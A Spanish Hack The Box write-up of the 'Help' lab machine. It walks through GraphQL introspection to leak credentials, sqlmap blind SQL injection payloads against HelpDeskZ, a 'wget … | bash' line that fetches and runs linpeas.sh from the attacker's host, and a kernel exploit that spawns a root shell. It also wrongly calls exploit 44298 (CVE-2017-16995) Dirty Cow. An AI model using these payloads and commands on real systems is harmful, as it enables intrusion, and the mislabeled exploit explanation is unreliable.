---
title: "Help - Hack The Box"
date: 2026-04-08
draft: false
slug: "htb-writeup-help"
excerpt: "Esta fue una máquina algo complicada. Después de analizar los escaneos de servicios, comenzamos con la página web activa en el puerto 80 y otra página web activa en el puerto 3000, pero en ambos casos no podemos encontrar algo relevante, por lo que aplicamos Fuzzing, descubriendo en la página web del puerto 80 el uso del sistema de tickets HelpDeskZ y en la del puerto 3000, enfocamos el Fuzzing para encontrar endpoints de una API, siendo que encontramos uno que pertenece a GraphQL. Sabiendo esto, aplicamos introspección y algunos filtros para poder obtener unas credenciales del endpoint de GraphQL. Dichas credenciales nos sirven para utilizar de forma autenticada el sistema HelpDeskZ, pudiendo así encontrar la versión de este, siendo la 1.0.2, que utilizamos para poder encontrar un Exploit acorde a esta versión. Encontramos un Exploit que aplica Blind SQL Injection para tratar de dumpear datos de la BD, pero al no funcionar, decidimos utilizar SQLMAP de forma agresiva para dumpear la BD, logrando obtener una contraseña que pertenece a un usuario de la máquina víctima. Probamos algunos usuarios y descubrimos un usuario válido que nos permite conectarnos a la máquina víctima vía SSH. Dentro, ejecutamos linpeas.sh para identificar alguna vulnerabilidad, descubriendo que la versión de Linux que usa la máquina víctima, es vulnerable a Dirty Cow. Utilizamos un Exploit de la BD de Exploit-DB que aplica el Dirty Cow, siendo así que escalamos privilegios y nos convertimos en Root."
categories: ["HackTheBox", "Easy"]
tags: ["Linux", "SSH", "GraphQL", "HelpDeskZ", "Web Enumeration", "Fuzzing", "API Fuzzing", "GraphQL Introspection", "BurpSuite", "Blind SQL Injection", "HelpDeskZ < 1.0.2 - (Authenticated) SQL Injection", "Dirty Cow Exploit", "Privesc - Dirty Cow Exploit", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "ffuf"
  - "gobuster"
  - "BurpSuite"
  - "searchsploit"
  - "crackstation"
  - "sqlmap"
  - "ssh"
  - "linpeas.sh"
  - "wget"
  - "bash"
  - "scp"
  - "gcc"
  - "file"
links:
  - "https://graphql.org/learn/introspection/"
  - "https://portswigger.net/web-security/graphql#using-introspection"
  - "https://github.com/peass-ng/PEASS-ng"
  - "https://www.exploit-db.com/exploits/44298"
  - "https://dirtycow.ninja/"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-help/help.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 10.129.230.159
PING 10.129.230.159 (10.129.230.159) 56(84) bytes of data.
64 bytes from 10.129.230.159: icmp_seq=1 ttl=63 time=73.4 ms
64 bytes from 10.129.230.159: icmp_seq=2 ttl=63 time=69.1 ms
64 bytes from 10.129.230.159: icmp_seq=3 ttl=63 time=69.1 ms
64 bytes from 10.129.230.159: icmp_seq=4 ttl=63 time=70.4 ms

--- 10.129.230.159 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 69.067/70.503/73.369/1.744 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.230.159 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-03 12:49 -0600
Initiating SYN Stealth Scan at 12:49
Scanning 10.129.230.159 [65535 ports]
Discovered open port 80/tcp on 10.129.230.159
Discovered open port 22/tcp on 10.129.230.159
Discovered open port 3000/tcp on 10.129.230.159
Completed SYN Stealth Scan at 12:49, 25.00s elapsed (65535 total ports)
Nmap scan report for 10.129.230.159
Host is up, received user-set (0.12s latency).
Scanned at 2026-04-03 12:49:31 CST for 25s
Not shown: 55862 closed tcp ports (reset), 9670 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
3000/tcp open  ppp     syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 25.08 seconds
           Raw packets sent: 122025 (5.369MB) | Rcvd: 58164 (2.327MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Vemos que hay 3 puertos abiertos, pero parece que la intrusión será por el **puerto 80**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80,3000 10.129.230.159 -oN targeted
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-03 12:50 -0600
Nmap scan report for 10.129.230.159
Host is up (0.070s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18

|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Did not follow redirect to http://help.htb/
3000/tcp open  http    Node.js Express framework

|_http-title: Site doesn't have a title (application/json; charset=utf-8).
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.18 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Gracias al escaneo de servicios, vemos bastante información útil:
* El **puerto 22**, que es el **servicio SSH**, muestra una versión vieja de **SSH** y que es vulnerable a un Exploit con el que puedes enumerar usuarios.
* Al entrar en el **puerto 80**, nos redirigirá al dominio `http://help.htb/`.
* El **puerto 3000** muestra el uso de **Node.js Express**, que ya se ha visto que es vulnerable a **Inyección de Comandos** y **SSRF**.

Registremos el dominio en el `/etc/hosts`:
```bash
echo "10.129.230.159 help.htb" >> /etc/hosts
```

Se nota que es una máquina algo vieja, pero vamos a resolverla empezando por la página web del **puerto 80**.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/htb-writeup-help/Captura1.png">
</p>

Parece que solo nos esta mostrando la página por defecto de **Apache2**.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-help/Captura2.png">
</p>

Nos llama la atención el uso de **PHP**.

No encontramos algo más en esta página, por lo que puede que se esté utilizando para mostrar algún servicio que podríamos descubrir aplicando **Fuzzing**, pero lo haremos más adelante.

Vayamos a la página web del **puerto 3000**.

### Analizando Página Web del Puerto 3000 {#Puerto3000}

Entremos:

<p align="center">
<img src="/assets/images/htb-writeup-help/Captura3.png">
</p>

Pareciera que entramos a una API, ya que la respuesta nos la da en formato **JSON**, que es común al consultar una **API**.

Observa el mensaje que nos muestra, siendo que debemos dar la data correcta para obtener alguna contraseña, pero si tratamos de enviar algo, nos dará un error.

De momento no podremos ver más, así que lo más seguro es que podamos encontrar endpoints ocultos cuando apliquemos **Fuzzing** y debemos probarlos con tal de obtener las credenciales que se mencionan.

Entonces, apliquemos **Fuzzing** a ambas páginas.

### Fuzzing {#fuzz}

Esto lo dividiremos en dos partes para mostrar la aplicación de **Fuzzing** en las dos páginas activas de la máquina víctima.

#### Aplicando Fuzzing a Página Web de Puerto 80 {#fuzzHTTP}

Primero probemos con **ffuf**:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt:FUZZ -u http://help.htb/FUZZ -t 300 -mc 200,301

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://help.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200,301
________________________________________________

support                 [Status: 301, Size: 306, Words: 20, Lines: 10, Duration: 5096ms]
javascript              [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 8369ms]
index.html              [Status: 200, Size: 11321, Words: 3503, Lines: 376, Duration: 71ms]
.                       [Status: 200, Size: 11321, Words: 3503, Lines: 376, Duration: 78ms]
:: Progress: [128623/128623] :: Job [1/1] :: 145 req/sec :: Duration: [0:01:34] :: Errors: 72 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*	     | Para indicar la cantidad de hilos a usar. |
| *-mc*	     | Para aplicar un filtro que solo muestre resultados con un código de estado específico. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://help.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt -s 200,301 -b "" -t 300 --ne
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:            http://help.htb/
[+] Method:         GET
[+] Threads:        300
[+] Wordlist:       /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt
[+] Status codes:   200,301
[+] User Agent:     gobuster/3.8.2
[+] Timeout:        10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 11321]
javascript           (Status: 301) [Size: 309] [--> http://help.htb/javascript/]
support              (Status: 301) [Size: 306] [--> http://help.htb/support/]
.                    (Status: 200) [Size: 11321]
Progress: 128370 / 128370 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-s*	     | Para aplicar un filtro que muestre solo los códigos de estado específicos. |
| *-b*	     | Para que funcione el filtro anterior. |
| *--ne*     | Para que no muestre errores. |

En ambos casos podemos ver 2 directorios, pero el que podremos ver será el de **support**:

<p align="center">
<img src="/assets/images/htb-writeup-help/Captura4.png">
</p>

Parece ser un servicio para crear tickets de soporte técnico y, para poder interactuar con esto, necesitamos credenciales válidas que de momento no tenemos.

#### Aplicando Fuzzing a Página Web de Puerto 3000 - Buscando Endpoints de APIs {#fuzzPuerto3000}

Algo importante cuando se aplica **Fuzzing** para encontrar **APIs** es que estas funcionan en su mayoría con peticiones **POST**.

Primero probemos con **ffuf**:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints-res.txt:FUZZ -X POST -u http://10.129.230.159:3000/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.129.230.159:3000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints-res.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

graphql                 [Status: 500, Size: 61, Words: 9, Lines: 1, Duration: 72ms]
graphql                 [Status: 500, Size: 61, Words: 9, Lines: 1, Duration: 88ms]
:: Progress: [12334/12334] :: Job [1/1] :: 557 req/sec :: Duration: [0:00:29] :: Errors: 0 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-X*	     | Para específicar un método HTTP a usar. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://10.129.230.159:3000/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints-res.txt -m POST --ne
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.230.159:3000/
[+] Method:                  POST
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints-res.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
graphql              (Status: 500) [Size: 61]
graphql              (Status: 500) [Size: 61]
Progress: 12334 / 12334 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-m*	     | Para específicar un método HTTP a usar. |
| *--ne*     | Para que no muestre errores. |

En ambos casos, encontramos un endpoint llamado **graphql**, lo que nos indica que se está utilizando **GraphQL** en esta página web.

Y al visitarla, observa el mensaje que nos da:

<p align="center">
<img src="/assets/images/htb-writeup-help/Captura5.png">
</p>

Parece que tendremos que jugar con este endpoint para mandarle la data correcta y así obtener las credenciales que se mencionan en la página principal.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Instrospección y Filtros para Obtener Credenciales en GraphQL {#Graphql}

Al identificar que se utiliza **GraphQL**, una de las técnicas que podemos aplicar para enumerar la BD es la **Introspección (Introspection)**:

| **Introspection** |
|:-----------------:|
| *La introspección en GraphQL es la capacidad que tiene la propia API de describirse a sí misma, permitiendo a un cliente consultar su estructura interna. Es un mecanismo que permite descubrir qué consultas (queries), modificaciones (mutations), tipos de datos y campos existen en una API GraphQL, sin necesidad de documentación externa.* |

Aquí te dejo un par de blogs que mencionan cómo aplicar la **Introspección**:
* <a href="https://graphql.org/learn/introspection/" target="_blank">GraphQL: Introspection</a>
* <a href="https://portswigger.net/web-security/graphql#using-introspection" target="_blank">PortSwigger: GraphQL - Using Introspection</a>

Para poder aplicarla, vamos a capturar la petición que se hace hacia el endpoint `/graphql` con **BurpSuite** y la mandamos al **Repeater**:

<p align="center">
<img src="/assets/images/htb-writeup-help/Captura6.png">
</p>

Cambiaremos el método a **POST** y modificaremos la cabecera `Content-Type` con `application/json` para que acepte datos en **JSON**:

<p align="center">
<img src="/assets/images/htb-writeup-help/Captura7.png">
</p>

Ahora, puede ocupar la siguiente query de **Introspección**:
```bash
{ "query": "{ __schema { types { name } } }" }
```

O dándole clic derecho en la petición, veremos que aparece hasta arriba la opción **GraphQL**, que nos da una lista de opciones, siendo una de estas la de **Set introspection query**:

<p align="center">
<img src="/assets/images/htb-writeup-help/Captura8.png">
</p>

En mi caso, ocuparé la primera opción, ya que te da solamente las variables y no información extra, aunque también te sugiero que pruebes la opción de **BurpSuite** para ver el resultado.

Observa las variables que podemos encontrar:

<p align="center">
<img src="/assets/images/htb-writeup-help/Captura9.png">
</p>

Ahí podemos ver una variable llamada **User**.

Vamos a consultarla con la siguiente query para poder ver cuáles son sus campos:
```bash
{ "query": "{ __type(name:\"User\") { name fields { name } } }" }
```

<p align="center">
<img src="/assets/images/htb-writeup-help/Captura10.png">
</p>

Ahí vemos que ocupa los argumentos **username** y **password**, así que usaremos la siguiente query:
```bash
{ "query": "{ user { username password } }" }
```

<p align="center">
<img src="/assets/images/htb-writeup-help/Captura11.png">
</p>

Obtuvimos un usuario y contraseña, pero la contraseña parece ser un **Hash MD5**.

Podemos utilizar la página **Crackstation** para poder crackear ese Hash:

<p align="center">
<img src="/assets/images/htb-writeup-help/Captura12.png">
</p>

Bien, ya tenemos la contraseña.

Probando esas credenciales en **HelpDeskZ**, ganaremos acceso a la aplicación:

<p align="center">
<img src="/assets/images/htb-writeup-help/Captura13.png">
</p>

Busquemos una forma de explotar este servicio.

#### Identificando Exploits para HelpDeskZ {#Exploits}

Si buscamos un Exploit para **HelpDeskZ**, encontraremos los siguientes:
```bash
searchsploit helpdeskZ
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path

|---|---|
HelpDeskZ 1.0.2 - Arbitrary File Upload                                                                                                                     | php/webapps/40300.py
HelpDeskZ < 1.0.2 - (Authenticated) SQL Injection / Unauthorized File Download                                                                              | php/webapps/41200.py
Helpdeskz v2.0.2 - Stored XSS                                                                                                                               | php/webapps/52068.txt

|---|---|
Shellcodes: No Results
```

Tenemos 3 Exploits que podríamos usar, pero podemos descartar algunos si encontramos la versión que se está usando de **HelpDeskZ**, siendo que podemos obtenerla al apuntar a la ruta `/readme.html`:

<p align="center">
<img src="/assets/images/htb-writeup-help/Captura14.png">
</p>

Se está usando la versión **1.0.2**.

Ahora podemos utilizar/analizar estos dos Exploits para aplicarlos.

### Probando Exploit: HelpDeskZ < 1.0.2 - (Authenticated) SQL Injection / Unauthorized File Download {#HelpDeskZ2}

Desarguemos ese Exploit:
```bash
searchsploit -m php/webapps/41200.py
  Exploit: HelpDeskZ < 1.0.2 - (Authenticated) SQL Injection / Unauthorized File Download
      URL: https://www.exploit-db.com/exploits/41200
     Path: /usr/share/exploitdb/exploits/php/webapps/41200.py
    Codes: N/A
 Verified: True
File Type: Python script, Unicode text, UTF-8 text executable, with very long lines (317)
```

En el Exploit se nos deja un comentario de cómo funciona la **Inyección SQL** que resulta ser una **ciega/blind**:
```bash
HelpDeskZ <= v1.0.2 suffers from an sql injection vulnerability that allow to retrieve administrator access data, and download unauthorized attachments.

Software after ticket submit allow to download attachment by entering following link:
http://127.0.0.1/helpdeskz/?/?v=view_tickets&action=ticket&param[]=2(VALID_TICKET_ID_HERE)&param[]=attachment&param[]=1&param[]=1(ATTACHMENT_ID_HERE)
...
...
Steps to reproduce:

http://127.0.0.1/helpdeskz/?/?v=view_tickets&action=ticket&param[]=2(VALID_TICKET_ID_HERE)&param[]=attachment&param[]=1&param[]=1 or id>0 -- -
```
En resumen, se nos dice que la vulnerabilidad se encuentra al momento de descargar un archivo, que es donde podemos aplicar la **Inyección SQL Ciega** y parece enfocarse en el parámetro `param[]`.

Para reproducirla, necesitamos crear un ticket y debemos cargar un archivo que acepte la página, como uno de texto:

<p align="center">
<img src="/assets/images/htb-writeup-help/Captura15.png">
</p>

Revisando ese ticket y haciendo **hoovering**, encontraremos la ruta que es vulnerable:

<p align="center">
<img src="/assets/images/htb-writeup-help/Captura16.png">
</p>

Tan solo abre esa ruta en otra pestaña y aplica un **SQLi**:

<p align="center">
<img src="/assets/images/htb-writeup-help/Captura17.png">
</p>

Como ya sabemos que es una inyección ciega, tardaríamos bastante tiempo en tratar de dumpear la BD con estas inyecciones, así que para agilizarlo, usaremos la herramienta **SQLMAP**:
```bash
sqlmap -r requests.txt --level 5 --risk 3 -p param[] --batch
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.10#stable}

|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org
...
...
...
[19:33:00] [INFO] checking if the injection point on GET parameter 'param[]' is a false positive
GET parameter 'param[]' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 446 HTTP(s) requests:
---
Parameter: param[] (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6 AND 6741=6741

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6 AND (SELECT 5698 FROM (SELECT(SLEEP(5)))lUvm)
---
[19:33:03] [INFO] the back-end DBMS is MySQL
```
Excelente, ya pudimos identificar dónde aplicar la inyección.

Ahora vamos a dumpear la BD:
```bash
sqlmap -r requests.txt --level 5 --risk 3 -p param[] --dump
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.10#stable}

|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org
...
...
...
[19:39:57] [INFO] cracked password 'Welcome1' for user 'admin'                                                                                                                               
Database: support                                                                                                                                                                            
Table: staff
[1 entry]
+----+--------------------+------------+--------+---------+----------+---------------+-----------------------------------------------------+----------+----------+--------------------------------+--------------------+------------+------------------------+

| id | email              | login      | avatar | admin   | status   | fullname      | password                                            | timezone | username | signature                      | department         | last_login | newticket_notification |
+----+--------------------+------------+--------+---------+----------+---------------+-----------------------------------------------------+----------+----------+--------------------------------+--------------------+------------+------------------------+

| 1  | support@mysite.com | 1547216217 | NULL   | 1       | Enable   | Administrator | d318f44739dced66793b1a603028133a76ae680e (********) | <blank>  | admin    | Best regards,\r\nAdministrator | a:1:{i:0;s:1:"1";} | 1543429746 | 0                      |
+----+--------------------+------------+--------+---------+----------+---------------+-----------------------------------------------------+----------+----------+--------------------------------+--------------------+------------+------------------------+
```
Obtuvimos un usuario y contraseña que podemos probar en el **servicio SSH**.

Si bien el usuario no es correcto, solo toma un poco de tiempo adivinar cuál es el correcto:
```bash
ssh help@10.129.230.159
help@10.129.230.159's password: 
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.4.0-116-generic x86_64)
...
Last login: Fri Jan 11 06:18:50 2019
help@help:~$ whoami
help
```
Estamos dentro.

Busquemos la flag del usuario:
```bash
help@help:~$ ls
help  npm-debug.log  user.txt
help@help:~$ cat user.txt
...
```

## Post Explotación {#Post}

### Abusando de Versión Vulnerable de Linux Kernel para Escalar Privilegios (Dirty Cow Exploit) {#LinKernel}

Dentro de la máquina, no encontraremos algún privilegio o algo que nos ayude a escalar privilegios, así que vamos a ejecutar **linpeas.sh**:
* <a href="https://github.com/peass-ng/PEASS-ng" target="_blank">Repositorio de peass-ng: PEASS-ng</a>

Una vez que lo descargues, puedes enviar el binario al **SSH** con **scp** o puedes ejecutarlo remotamente de la siguiente forma (para esto, primero debes levantar un servidor con **Python**):
```bash
help@help:~$ wget -qO- http://Tu_IP/linpeas.sh | bash
...
...
╔══════════╣ Operative system
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits
Linux version 4.4.0-116-generic (buildd@lgw01-amd64-021) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.9) ) #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018
Distributor ID:	Ubuntu
Description:	Ubuntu 16.04.5 LTS
Release:	16.04
Codename:	xenial
```
Al revisar el resultado, se recalca la versión del **Kernel de Linux**, pues parece ser vulnerable.

Busquemos un Exploit para esa versión con **searchsploit**:
```bash
searchsploit 'Linux Kernel 4.4.0-116 (Ubuntu 16.04.4)'
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path

|---|---|
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                                                                      | linux/local/44298.c

|---|---|
Shellcodes: No Results
```
Excelente, tenemos un Exploit que nos va a permitir escalar privilegios.

Investigando este Exploit, resulta que es la vulnerabilidad conocida como **Dirty Cow**:

| **Dirty Cow Exploit** |
|:---------------------:|
| *Dirty COW es una vulnerabilidad de escalación de privilegios local en el Linux Kernel que permite a un usuario sin privilegios modificar archivos de solo lectura aprovechando una condición de carrera en el mecanismo de memoria llamado Copy-On-Write (COW).* |

Vamos a descargarlo:
```bash
searchsploit -m linux/local/44298.c
  Exploit: Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/44298
     Path: /usr/share/exploitdb/exploits/linux/local/44298.c
    Codes: CVE-2017-16995
 Verified: False
File Type: C source, ASCII text
```

Y lo mandamos al **SSH**, que puedes hacerlo con **scp**:
```bash
scp 44298.c help@10.129.230.159:/home/help/
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
help@10.129.230.159's password: 
44298.c
```
Al ser este un script hecho en **lenguaje C**, primero necesitamos compilarlo y eso lo podemos hacer con el comando **gcc**, que curiosamente lo tiene la máquina víctima.

Para compilarlo, solamente le damos el script a compilar y le damos un nombre con el parámetro `-o`:
```bash
help@help:~$ gcc 44298.c -o privesc
help@help:~$ ls
44298.c  privesc  help  npm-debug.log  user.txt
help@help:~$ file privesc
privesc: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8a4e9208573e68938a4da70ca01d9581059138e8, not stripped
```
Ya tenemos el binario compilado.

Vamos a ejecutarlo:
```bash
help@help:~$ ./privesc
task_struct = ffff88003b8de200
uidptr = ffff88001631e784
spawning root shell
root@help:~# whoami
root
```
Listo, ya somos **Root**.

Obtengamos la última flag:
```bash
root@help:~# cd /root
root@help:/root# ls
root.txt  snap
root@help:/root# cat root.txt
..
```
Y con esto, terminamos la máquina.
